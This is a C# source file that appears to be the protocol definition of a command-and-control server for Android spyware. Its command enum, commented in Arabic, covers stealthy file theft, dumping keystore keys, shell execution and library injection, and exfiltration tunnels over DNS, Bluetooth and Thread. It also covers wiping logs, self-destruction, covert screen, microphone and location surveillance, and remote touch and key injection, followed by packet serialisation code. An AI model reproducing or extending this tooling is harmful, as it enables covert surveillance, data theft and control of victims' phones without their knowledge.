using System;

namespace TcpServerApp.Models
{
    public enum BinaryCmdType : byte
    {
        // ─── [0x01 - 0x0F] Core File Navigation ───
        RECURSIVE_GHOST_LIST = 0x01,  // عرض الملفات مع تجاوز حماية MediaStore
        DOWNLOAD_FILE_BINARY = 0x02,  // تحميل ثنائي (Chunked)
        UPLOAD_FILE_BINARY   = 0x03,  // رفع ثنائي مكتوم
        SEARCH_SENSITIVE_DB  = 0x04,  // بحث ذكي عن قواعد البيانات (SQLite/Realm)
        COMPRESS_ZIP         = 0x05,  // ضغط مجلد أو ملف (Native Zip)
        DECOMPRESS_ZIP       = 0x06,  // فك ضغط (Native Unzip)
        
        // ─── [0x10 - 0x1F] Anti-Forensics & Stealth ───
        PHYSICAL_WIPE_NATIVE = 0x10,  // مسح فيزيائي (7-pass Gutmann)
        WIPE_JOURNAL_LOGS    = 0x11,  // مسح سجلات الـ Runtime والـ Logcat للتمويه
        PROTECT_PROCESS_OOM  = 0x12,  // رفع أولوية العملية (Anti-Kill) لضمان البقاء
        SELF_DESTRUCT_NATIVE = 0x13,  // تدمير ذاتي وحذف الأثر من الـ Storage
        
        // ─── [0x20 - 0x2F] Native Exploitation & Injection ───
        NATIVE_SHELL_EXEC       = 0x20, // تنفيذ أوامر Shell عبر JNI مباشرة
        INJECT_SO_LIBRARY       = 0x21, // حقن مكتبة .so في ذاكرة التطبيق
        MEMORY_DUMP_KEYSTORE    = 0x22, // استخراج مفاتيح التشفير من AndroidKeyStore
        HOOK_CRYPTO_RUNTIME     = 0x23, // اعتراض عمليات التشفير (Cleartext Capture)
        
        // ─── [0x30 - 0x3F] Covert Channels & OOB (API 36) ───
        DNS_DATA_TUNNELING     = 0x30, // تسريب البيانات عبر استعلامات DNS
        L2CAP_BLE_TUNNEL       = 0x31, // نفق Bluetooth مخفي (IPv6 Over BLE)
        THREAD_MESH_BRIDGE     = 0x32, // استخدام Thread/Matter IoT كجسر للـ C2
        INTERCEPT_APP_TRAFFIC  = 0x33, // اعتراض الـ Traffic عبر JNI TrafficStats
        BYPASS_FILE_SANDBOX    = 0x34, // تجاوز الـ Scoped Storage (API 36 Bypass)
        
        // ─── [0x40 - 0x4F] Surveillance & Intelligence ───
        SCREEN_MIRROR_NATIVE    = 0x40, // بث الشاشة المباشر (Raw Frame Capture)
        MIC_STREAM_JNI          = 0x41, // بث الصوت (PCM Raw Stream)
        LOCATION_SILENT_TRACE   = 0x42, // تتبع الموقع بدون تفعيل أيقونة الـ GPS
        DUMP_CONTACTS_SECURE    = 0x43,  // سحب الأسماء متجاوزاً الـ Privacy Dashboard
        
        // ─── [0x50 - 0x5F] Input Injection (Elite Control) ───
        INPUT_TOUCH_EVENT       = 0x50, // إرسال إحداثيات اللمس (X,Y,Action)
        INPUT_KEY_EVENT         = 0x51  // إرسال نقرات المفاتيح (Unicode/KeyCode)
    }

    public class BinaryPacket
    {
        public byte Magic { get; set; } = 0x36; // Android 16 Magic Byte
        public BinaryCmdType Command { get; set; }
        public int PayloadLength { get; set; }
        public byte[] Payload { get; set; }

        public byte[] Serialize()
        {
            byte[] data = new byte[6 + (Payload?.Length ?? 0)];
            data[0] = Magic;
            data[1] = (byte)Command;
            
            byte[] lenBytes = BitConverter.GetBytes(Payload?.Length ?? 0);
            Array.Copy(lenBytes, 0, data, 2, 4);
            
            if (Payload != null)
            {
                Array.Copy(Payload, 0, data, 6, Payload.Length);
            }
            return data;
        }

        public static BinaryPacket Deserialize(byte[] data)
        {
            if (data == null || data.Length < 6) return null;
            
            var packet = new BinaryPacket();
            packet.Magic = data[0];
            packet.Command = (BinaryCmdType)data[1];
            packet.PayloadLength = BitConverter.ToInt32(data, 2);
            
            if (packet.PayloadLength > 0 && data.Length >= 6 + packet.PayloadLength)
            {
                packet.Payload = new byte[packet.PayloadLength];
                Array.Copy(data, 6, packet.Payload, 0, packet.PayloadLength);
            }
            
            return packet;
        }
    }

    public class FileItem
    {
        public string Name { get; set; }
        public string Size { get; set; }
        public string Type { get; set; }
        public bool IsDirectory { get; set; }
        public string Icon => IsDirectory ? "📁" : "📄";
    }
}
